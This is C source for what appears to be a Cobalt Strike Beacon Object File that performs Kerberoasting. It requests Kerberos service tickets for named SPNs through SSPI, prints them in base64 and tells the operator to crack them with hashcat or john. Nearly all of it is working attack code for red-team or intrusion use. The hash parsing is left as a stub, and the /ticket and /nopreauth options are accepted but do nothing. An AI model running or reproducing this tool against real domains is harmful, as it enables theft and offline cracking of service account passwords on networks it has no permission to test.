/*
 * krb_kerberoasting - Request service tickets for offline password cracking
 *
 * Usage: krb_kerberoasting /spn:SPN [/dc:DC] [/domain:DOMAIN]
 *        krb_kerberoasting /spn:SPN /ticket:BASE64 [/dc:DC]
 *        krb_kerberoasting /spn:SPN /nopreauth:USER [/dc:DC] [/domain:DOMAIN]
 */

/* Include krb5_struct.h first - it includes winsock2.h before windows.h */
#include "include/krb5_struct.h"
#include "include/krb5_utils.h"
#include "beacon.h"

#define SECURITY_WIN32
#include <sspi.h>

/* Extract TGS hash for cracking */
static void extract_tgs_hash(const BYTE* data, size_t len, const char* spn, formatp* output) {
    /* The service ticket is in AP-REQ format wrapped by SSPI
     * For hash extraction, we need the encrypted part of the ticket
     * Format: $krb5tgs$<etype>$*<spn>*$<checksum>$<edata2>
     */

    /* Base64 encode for output */
    size_t b64_len = ((len + 2) / 3) * 4 + 1;
    char* b64 = (char*)malloc(b64_len);
    if (!b64) return;

    base64_encode(data, len, b64);

    /* Output in hashcat format placeholder - actual parsing would extract enc-part */
    BeaconFormatPrintf(output, "[*] Service ticket obtained for: %s\n", spn);
    BeaconFormatPrintf(output, "[*] Ticket size: %d bytes\n", (int)len);

    /* For proper hash extraction, would need to:
     * 1. Parse the AP-REQ to get the ticket
     * 2. Extract the enc-part from the ticket
     * 3. Format as $krb5tgs$<etype>$*<spn>*$<checksum>$<edata>
     */
    BeaconFormatPrintf(output, "\n[*] Raw ticket (Base64):\n%s\n\n", b64);
    BeaconFormatPrintf(output, "[*] Note: Use ticket parser to extract crackable hash\n");

    free(b64);
}

/* Request TGS via SSPI and extract hash */
static int kerberoast_spn(const char* spn, formatp* output) {
    SECURITY_STATUS ss;
    CredHandle credHandle;
    CtxtHandle ctxHandle;
    TimeStamp expiry;
    SecBufferDesc outDesc;
    SecBuffer outBuf;
    ULONG ctxAttr;
    int result = 0;

    memset(&credHandle, 0, sizeof(credHandle));
    memset(&ctxHandle, 0, sizeof(ctxHandle));

    /* Acquire credentials for current user */
    ss = SECUR32$AcquireCredentialsHandleA(NULL, "Kerberos", SECPKG_CRED_OUTBOUND,
                                            NULL, NULL, NULL, NULL, &credHandle, &expiry);
    if (ss != SEC_E_OK) {
        BeaconFormatPrintf(output, "[-] AcquireCredentialsHandle failed: 0x%08X\n", ss);
        return 0;
    }

    outBuf.cbBuffer = 0;
    outBuf.BufferType = SECBUFFER_TOKEN;
    outBuf.pvBuffer = NULL;
    outDesc.ulVersion = SECBUFFER_VERSION;
    outDesc.cBuffers = 1;
    outDesc.pBuffers = &outBuf;

    ss = SECUR32$InitializeSecurityContextA(&credHandle, NULL, (LPSTR)spn,
                                             ISC_REQ_ALLOCATE_MEMORY,
                                             0, SECURITY_NATIVE_DREP, NULL, 0,
                                             &ctxHandle, &outDesc, &ctxAttr, &expiry);

    if (ss == SEC_E_OK || ss == SEC_I_CONTINUE_NEEDED) {
        if (outBuf.cbBuffer > 0 && outBuf.pvBuffer) {
            extract_tgs_hash((BYTE*)outBuf.pvBuffer, outBuf.cbBuffer, spn, output);
            result = 1;
            SECUR32$FreeContextBuffer(outBuf.pvBuffer);
        }
        SECUR32$DeleteSecurityContext(&ctxHandle);
    } else {
        BeaconFormatPrintf(output, "[-] Failed to get TGS for %s: 0x%08X\n", spn, ss);
        if (ss == SEC_E_TARGET_UNKNOWN) {
            BeaconFormatPrintf(output, "    SPN not found in domain\n");
        }
    }

    SECUR32$FreeCredentialsHandle(&credHandle);
    return result;
}


void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;

    BeaconFormatAlloc(&output, 64 * 1024);
    arg_init(&parser, args, alen);

    char* spn = arg_get(&parser, "spn");
    char* domain = arg_get(&parser, "domain");
    char* dc = arg_get(&parser, "dc");
    char* ticket = arg_get(&parser, "ticket");
    char* nopreauth_user = arg_get(&parser, "nopreauth");

    if (!spn) {
        BeaconPrintf(CALLBACK_ERROR, "Usage: krb_kerberoasting /spn:SPN [/dc:DC] [/domain:DOMAIN]");
        BeaconPrintf(CALLBACK_ERROR, "       krb_kerberoasting /spn:SPN /ticket:BASE64");
        BeaconPrintf(CALLBACK_ERROR, "       krb_kerberoasting /spn:SPN /nopreauth:USER [/dc:DC]");
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "[*] Action: Kerberoasting\n");
    BeaconFormatPrintf(&output, "[*] Target SPN(s): %s\n", spn);
    if (domain) BeaconFormatPrintf(&output, "[*] Domain: %s\n", domain);
    if (dc) BeaconFormatPrintf(&output, "[*] DC: %s\n", dc);
    if (nopreauth_user) BeaconFormatPrintf(&output, "[*] Using nopreauth for user: %s\n", nopreauth_user);
    BeaconFormatPrintf(&output, "\n");

    /* Handle multiple SPNs */
    char* spn_copy = (char*)malloc(strlen(spn) + 1);
    strcpy(spn_copy, spn);

    char* current_spn = spn_copy;
    char* next;
    int success_count = 0;
    int total_count = 0;

    while (current_spn && *current_spn) {
        next = strchr(current_spn, ',');
        if (next) {
            *next = '\0';
            next++;
        }

        while (*current_spn == ' ') current_spn++;

        if (*current_spn) {
            total_count++;
            BeaconFormatPrintf(&output, "[*] Processing SPN: %s\n", current_spn);

            if (kerberoast_spn(current_spn, &output)) {
                success_count++;
            }
            BeaconFormatPrintf(&output, "\n");
        }

        current_spn = next;
    }

    free(spn_copy);

    BeaconFormatPrintf(&output, "[*] Kerberoasting complete!\n");
    BeaconFormatPrintf(&output, "[*] Successfully roasted %d/%d SPNs\n", success_count, total_count);
    BeaconFormatPrintf(&output, "[*] Use hashcat -m 13100 or john --format=krb5tgs to crack\n");

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));

cleanup:
    BeaconFormatFree(&output);
    if (spn) free(spn);
    if (domain) free(domain);
    if (dc) free(dc);
    if (ticket) free(ticket);
    if (nopreauth_user) free(nopreauth_user);
}
